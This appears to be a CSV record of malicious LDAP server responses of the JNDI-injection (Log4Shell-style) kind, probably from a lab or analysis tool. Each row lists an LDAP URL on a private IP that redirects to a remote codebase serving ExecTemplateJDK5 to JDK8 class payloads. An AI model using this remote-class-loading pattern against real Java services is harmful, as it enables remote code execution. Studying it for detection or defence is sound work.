ldap_url,valid redirect,response.javaClassName,response.javaCodeBase,response.objectClass,response.javaFactory,payload url
ldap://192.168.0.28:1389/aafo6i,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.28:8180/,javaNamingReference,ExecTemplateJDK8,http://192.168.0.28:8180/ExecTemplateJDK8.class
ldap://192.168.0.28:1389/wrfcc8,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.28:8180/,javaNamingReference,ExecTemplateJDK7,http://192.168.0.28:8180/ExecTemplateJDK7.class
ldap://192.168.0.28:1389/hxyjvf,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.28:8180/,javaNamingReference,ExecTemplateJDK6,http://192.168.0.28:8180/ExecTemplateJDK6.class
ldap://192.168.0.28:1389/8abvdr,VALID LDAP RESPONSE (GOT REDIRECT),foo,http://192.168.0.28:8180/,javaNamingReference,ExecTemplateJDK5,http://192.168.0.28:8180/ExecTemplateJDK5.class
